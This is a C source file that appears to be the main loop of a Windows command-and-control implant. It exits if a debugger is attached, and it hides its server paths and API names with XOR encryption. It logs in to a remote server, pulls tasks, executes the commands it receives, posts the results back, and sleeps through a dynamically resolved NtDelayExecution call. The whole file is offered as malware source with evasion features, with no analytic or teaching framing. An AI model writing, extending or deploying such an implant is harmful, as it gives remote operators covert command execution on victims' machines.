#include "transport_winhttp.h"
#include "base.h"
#include "command.h"

// https://ntdoc.m417z.com/ntdelayexecution
typedef NTSTATUS ( NTAPI * NtDelayExecution_t ) (
    BOOLEAN        Alertable,
    PLARGE_INTEGER DelayInterval
);

int main( int argc, char* argv[] )
{

    // If a debugger is attached, just return
    if ( isDebugged() ) return 0;

    while ( TRUE ) {

        // Encrypted resources
        // /taskings + size
        char encryptedTaskings[]   = { 0xd5, 0xa6, 0xc4, 0x99, 0x78, 0x33, 0xf3, 0x35, 0x87, 0x6e, 0xd4, 0xb9, 0xc5, 0x42, 0x8, 0x1e };
        size_t encTaskingsSize     = sizeof( encryptedTaskings );
        // /login + size
        char encryptedLogin[]      = { 0x6f, 0xf2, 0x9b, 0xe3, 0x4b, 0x20, 0xb9, 0x87, 0xb, 0x27, 0xa, 0xc5, 0x67, 0x22, 0xc9, 0xe7 };
        size_t encLoginSize        = sizeof( encryptedLogin );
        // /results + size
        char encryptedResults[]    = { 0x5f, 0xce, 0xed, 0xec, 0x41, 0x95, 0xdc, 0x7c, 0x8, 0x8c, 0x2, 0xbc, 0x67, 0xb0, 0xe, 0xc3 };
        size_t encResultsSize      = sizeof( encryptedResults );

        char xorkey[]              = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
        char sNTDLL[]              = { 0xf, 0x16, 0x7, 0x8, 0x9, 0x46 };
        char sNtDelayExecution[]   = { 0xf, 0x36, 0x7, 0x21, 0x29, 0x27, 0x3e, 0x74, 0x4a, 0x56, 0x57, 0x34, 0x36, 0x2a, 0x2b, 0x2b, 0x46 };
        
        // POST request on /login to capture the cookie
        post_login( encryptedLogin, encLoginSize );

        // GET request on /taskings resource
        get_task( encryptedTaskings, encTaskingsSize );

        // Parse the command and then execute it
        exec_command( bufferResponse );

        // POST request on /results resource
        post_command_results( encryptedResults, encResultsSize, jsonData );

        XORDecrypt( (char *) sNTDLL,            sizeof( sNTDLL ),             (char *) xorkey, sizeof( xorkey ) );
        XORDecrypt( (char *) sNtDelayExecution, sizeof( sNtDelayExecution ),  (char *) xorkey, sizeof( xorkey ) );
        
        NtDelayExecution_t pNtDelayExecution = (NtDelayExecution_t) GetProcAddress( GetModuleHandle( sNTDLL ), sNtDelayExecution );
        LARGE_INTEGER interval;
        // Sleep for 10 seconds: -(dwMilliseconds * 10000) = -(10000 * 10000)
        interval.QuadPart = -100000000;
        // Initiate a sleep on the current thread
        pNtDelayExecution( FALSE,        // The sleep is not alertable
                           &interval );

        // Free the memory allocated to the buffer
        free( bufferResponse );

        // Free the memory allocated for command and result
        free( jsonData );
    }

    return 0;
}